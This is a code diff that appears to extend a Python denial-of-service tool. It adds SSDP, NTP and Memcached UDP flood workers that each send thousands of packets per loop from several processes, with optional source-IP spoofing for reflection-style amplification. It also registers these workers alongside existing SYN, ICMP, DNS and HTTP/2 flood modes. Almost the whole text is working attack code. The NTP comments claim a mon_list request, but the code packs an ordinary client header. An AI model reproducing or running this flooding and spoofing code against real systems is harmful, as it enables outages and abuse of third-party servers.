@@ -932,6 +932,157 @@ async def icmp_worker(name, url, stats, duration, stop, payload_size=0):
     stats.packets += total
     stats.bytes += total * 276  # avg ICMP packet size
 
+# ── SSDP/UPnP flood: M-SEARCH flood (UDP 1900) ──────────────────
+def _mp_ssdp_flood(args_tuple):
+    """Multi-process SSDP M-SEARCH flooder: IoT/UPnP target."""
+    import time as _time
+    import random as _rnd
+    host, port, duration = args_tuple
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+    
+    # SSDP M-SEARCH requests
+    st_types = ['ssdp:all', 'upnp:rootdevice', 'urn:schemas-upnp-org:device:basic:1',
+                'urn:schemas-upnp-org:service:WANIPConnection:1',
+                'urn:ietf:params:ssdp:v1']
+    sent = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        n = 5000
+        try:
+            for _ in range(n):
+                st = _rnd.choice(st_types)
+                mx = _rnd.randint(1, 30)
+                ssdp_req = (f"M-SEARCH * HTTP/1.1\r\n"
+                           f"HOST: 239.255.255.250:1900\r\n"
+                           f"MAN: \"ssdp:discover\"\r\n"
+                           f"MX: {mx}\r\n"
+                           f"ST: {st}\r\n\r\n").encode()
+                sock.sendto(ssdp_req, (host, port))
+            sent += n
+        except Exception:
+            break
+    sock.close()
+    return sent
+
+async def ssdp_worker(name, url, stats, duration, stop, payload_size=0):
+    """SSDP M-SEARCH flood worker."""
+    host, port = parse_udp(url)
+    n_procs = max(1, min(8, _UDP_NPROCS[0]))
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, duration)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_ssdp_flood, targets)
+    results = await _wait_pool(pool, async_result, duration + 15)
+    if results is None:
+        results = [0] * n_procs
+    total = sum(results) if isinstance(results, list) else results
+    stats.packets += total
+    stats.bytes += total * 150
+
+# ── NTP amplification: mon_list (UDP 123) ───────────────────────
+def _mp_ntp_flood(args_tuple):
+    """Multi-process NTP mon_list flooder: amplification attack."""
+    import time as _time
+    import random as _rnd
+    import struct as _struct
+    host, port, duration, src_ip = args_tuple
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+    if src_ip:
+        try:
+            sock.bind((src_ip, 0))
+        except OSError:
+            pass
+    
+    # NTP mon_list request: LI=3, VN=3, Mode=3, seq=0, stratum=0, poll=0, precision=0, root_delay=0, root_dispersion=0, ref_id=0
+    ntp_header = _struct.pack('!BHHIIIII', 0b11011011, 0, 0, 0, 0, 0, 0, 0)
+    sent = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        n = 5000
+        try:
+            for _ in range(n):
+                # NTP client: LI=3, VN=3, Mode=3 (client)
+                ntp_req = _struct.pack('!BHHIIIII', 0b11011011, 0, 0, 0, 0, 0, 0, 0)
+                sock.sendto(ntp_req, (host, port))
+            sent += n
+        except Exception:
+            break
+    sock.close()
+    return sent
+
+async def ntp_worker(name, url, stats, duration, stop, payload_size=0):
+    """NTP amplification worker."""
+    host, port = parse_udp(url)
+    n_procs = max(1, min(8, _UDP_NPROCS[0]))
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = []
+    for i in range(n_procs):
+        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
+        targets.append((host, port, duration, src_ip))
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_ntp_flood, targets)
+    results = await _wait_pool(pool, async_result, duration + 15)
+    if results is None:
+        results = [0] * n_procs
+    total = sum(results) if isinstance(results, list) else results
+    stats.packets += total
+    stats.bytes += total * 48
+
+# ── Memcached amplification: GET request (UDP 11211) ───────────
+def _mp_memcached_flood(args_tuple):
+    """Multi-process Memcached GET flooder: amplification attack."""
+    import time as _time
+    import random as _rnd
+    host, port, duration, src_ip = args_tuple
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+    if src_ip:
+        try:
+            sock.bind((src_ip, 0))
+        except OSError:
+            pass
+    
+    # Memcached GET request: "get key\r\n"
+    keys = ['key1', 'key2', 'user:1001', 'session:abc', 'cache:item', 'data:xyz',
+            'token:12345', 'config:main', 'stats:count', 'temp:tmp']
+    sent = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        n = 5000
+        try:
+            for _ in range(n):
+                key = _rnd.choice(keys)
+                memcached_req = f"get {key}\r\n".encode()
+                sock.sendto(memcached_req, (host, port))
+            sent += n
+        except Exception:
+            break
+    sock.close()
+    return sent
+
+async def memcached_worker(name, url, stats, duration, stop, payload_size=0):
+    """Memcached amplification worker."""
+    host, port = parse_udp(url)
+    n_procs = max(1, min(8, _UDP_NPROCS[0]))
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = []
+    for i in range(n_procs):
+        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
+        targets.append((host, port, duration, src_ip))
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_memcached_flood, targets)
+    results = await _wait_pool(pool, async_result, duration + 15)
+    if results is None:
+        results = [0] * n_procs
+    total = sum(results) if isinstance(results, list) else results
+    stats.packets += total
+    stats.bytes += total * 20
+
 # ── H2 multiprocess: raw socket + h2 frames ─────────────────────
 def _mp_h2_flood(args_tuple):
     """Multi-process H2 flooder: TLS + h2 in a child process.
@@ -1889,6 +2040,9 @@ WORKERS = {
     "h2mp":        h2mp_worker,
     "dns":         dns_worker,
     "icmp":        icmp_worker,
+    "ssdp":        ssdp_worker,
+    "ntp":         ntp_worker,
+    "memcached":   memcached_worker,
     "grpc":      grpc_worker,
     "grpcmp":    grpc_mp_worker,
     "quic":      quic_worker,
@@ -2073,7 +2227,7 @@ async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_
         per_mode = max(1, _UDP_NPROCS[0] // n_l4)
         _UDP_NPROCS[0] = per_mode
     
-    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'h2mp', 'dns', 'icmp'}
+    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'h2mp', 'dns', 'icmp', 'ssdp', 'ntp', 'memcached'}
     for mode in modes:
         worker_fn = WORKERS[mode]
         pl = payload_size if payload_size is not None else DEFAULT_PAYLOADS.get(mode, 0)
